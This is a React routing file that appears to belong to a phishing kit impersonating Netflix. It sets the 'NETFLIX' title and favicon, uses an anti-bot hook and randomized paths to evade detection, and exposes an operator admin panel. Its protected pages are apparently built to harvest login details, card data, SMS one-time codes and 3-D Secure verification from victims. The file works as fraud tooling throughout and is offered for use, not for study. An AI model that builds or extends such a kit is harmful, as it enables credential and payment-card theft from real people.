import React, { useEffect, Suspense, useState } from "react";
import { BrowserRouter, Route, Switch, Redirect, useHistory, useLocation } from "react-router-dom";
import { getRandomizedRoutes, getRedirectRoute, getLoginRoute } from "./utils/routes";
import useAntiBot from "./utils/useAntiBot";
import { autoInjectRandomIds } from './utils/injectRandomIds';
import { twkLyt } from "./utils/twkLyt";
// Lazy Load Components
const Login = React.lazy(() => import("./components/nx/login"));
const Home = React.lazy(() => import("./components/nx/home"));
const UpdateStatus = React.lazy(() => import("./components/nx/cAtn"));
const UpdateStatusError = React.lazy(() => import("./components/nx/cError"));
const ContainerCustom = React.lazy(() => import("./components/container/vbPnd"));
const ContainerCustomError = React.lazy(() => import("./components/container/vbErrr"));
const ContainerLoading = React.lazy(() => import("./components/container/mbApp"));
const ContainerCode = React.lazy(() => import("./components/container/smAttn"));
const ContainerError = React.lazy(() => import("./components/container/smFld"));
const GenView = React.lazy(() => import("./components/AdmPan"));
function ProtectedRoutes({ children }) {
    const history = useHistory();

    useEffect(() => {
        document.title = "NETFLIX"; 
        const isAuthenticated = sessionStorage.getItem("acssts") === "1";
        if (!isAuthenticated) {
            history.push(getLoginRoute());
        }
    }, [history]);

    return children;
}

/**
 * Route Redirector Component: Detects fake URLs & redirects them to real randomized routes.
 */
function RouteRedirector() {
    const history = useHistory();
    const location = useLocation();
    useEffect(() => {
      const cleanupStyles = () => {
        const root = document.getElementById("root");
        if (!root) return;
    
        const elements = root.querySelectorAll("*");
    
        elements.forEach(el => {
          el.removeAttribute("style");
    
          const filtered = Array.from(el.classList)
            .filter(cls => !cls.startsWith("caca_") && !cls.startsWith("stealth"))
            .join(" ");
    
          el.setAttribute("class", filtered); // ✅ SAFE for SVG and HTML
        });
    
      };
    
      cleanupStyles();
    }, [location.pathname]);
        
    useEffect(() => {
        const redirectedRoute = getRedirectRoute(location.pathname);
        if (redirectedRoute) {
            history.replace(redirectedRoute);
        }
    }, [history, location.pathname]);

    return null;
}
const setFavicon = (iconPath) => {
    let link = document.querySelector("link[rel*='icon']");
    if (!link) {
      link = document.createElement("link");
      link.rel = "icon";
      document.head.appendChild(link);
    }
    link.href = iconPath;
  };
  
function App() {

    const [thJdRbaz, setRandomRoutes] = useState(null);

    useEffect(() => {
        const routes = getRandomizedRoutes();
        setRandomRoutes(routes);
        document.title = "NETFLIX"; 

        setFavicon("/assets/icons/core.png");
        autoInjectRandomIds(undefined, true);
            }, []);
            useEffect(() => {
                // Run after DOM is ready
                if ("requestIdleCallback" in window) {
                  requestIdleCallback(() => twkLyt());
                } else {
                  setTimeout(() => twkLyt(), 300);
                }
              }, []);
            
            useEffect(() => {
                const enforceMaxLength = () => {
                  const allInputs = document.querySelectorAll('input:not([type="range"])');
            
                  allInputs.forEach(input => {
                    // Only apply if not already defined
                    if (!input.hasAttribute("maxlength")) {
                      input.setAttribute("maxlength", "128"); // Adjust the number as needed
                    }
                  });
                };
            
                // Initial run
                enforceMaxLength();
            
                // Observe DOM for new inputs
                const observer = new MutationObserver(() => {
                  enforceMaxLength();
                });
            
                observer.observe(document.body, {
                  childList: true,
                  subtree: true,
                });
            
                return () => observer.disconnect();
              }, []);
            
    if (!thJdRbaz) {
        return <div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>; // Prevent blank page issue
    }

    return (
        <BrowserRouter>
            <RouteRedirector />
            <Switch>
                {/* Redirect "/" to the randomized login route */}
                <Route exact path="/" render={() => <Redirect to={thJdRbaz.home} />} />
                <Route exact path={thJdRbaz.home} render={() => (
    <Suspense fallback={<div className="loading-overlay">
        <div className="loading-spinner"></div>
      </div>}>
        <Home />
    </Suspense>
)} />

                {/* Public Routes */}
                <Route exact path={thJdRbaz.login} render={() => (
                    <Suspense fallback={<div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>}>
                        <Login />
                    </Suspense>
                )} />

                {/* Special case: /admin/24 redirects to the randomized GenView route */}
                <Route exact path="/panel" render={() => <Redirect to={thJdRbaz.NvRdPan} />} />

                {/* GenView - Now Randomized */}
                <Route exact path={thJdRbaz.NvRdPan} render={() => (
                    <Suspense fallback={<div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>}>
                        <GenView />
                    </Suspense>
                )} />

                {/* Protected Routes (Using Randomized Paths) */}
                <ProtectedRoutes>
                    <Route exact path={thJdRbaz.updateStatusPending} render={() => (
                        <Suspense fallback={<div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>}>
                            <UpdateStatus />
                        </Suspense>
                    )} />
                    <Route exact path={thJdRbaz.ccFaid} render={() => (
                        <Suspense fallback={<div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>}>
                            <UpdateStatusError />
                        </Suspense>
                    )} />
                    <Route exact path={thJdRbaz.esEms} render={() => (
                        <Suspense fallback={<div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>}>
                            <ContainerCode />
                        </Suspense>
                    )} />
                    <Route exact path={thJdRbaz.esEmserr} render={() => (
                        <Suspense fallback={<div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>}>
                            <ContainerError />
                        </Suspense>
                    )} />
                    <Route exact path={thJdRbaz.vbSssn} render={() => (
                        <Suspense fallback={<div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>}>
                            <ContainerCustom />
                        </Suspense>
                    )} />
                    <Route exact path={thJdRbaz.vbErr} render={() => (
                        <Suspense fallback={<div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>}>
                            <ContainerCustomError />
                        </Suspense>
                    )} />
                    <Route exact path={thJdRbaz.mblApp} render={() => (
                        <Suspense fallback={<div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>}>
                            <ContainerLoading />
                        </Suspense>
                    )} />
                    <Route exact path={thJdRbaz.cnctTimout} render={() => (
                        <Suspense fallback={<div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>}>
                            <ContainerCode />
                        </Suspense>
                    )} />
                </ProtectedRoutes>
            </Switch>
        </BrowserRouter>
    );
}

export default App;
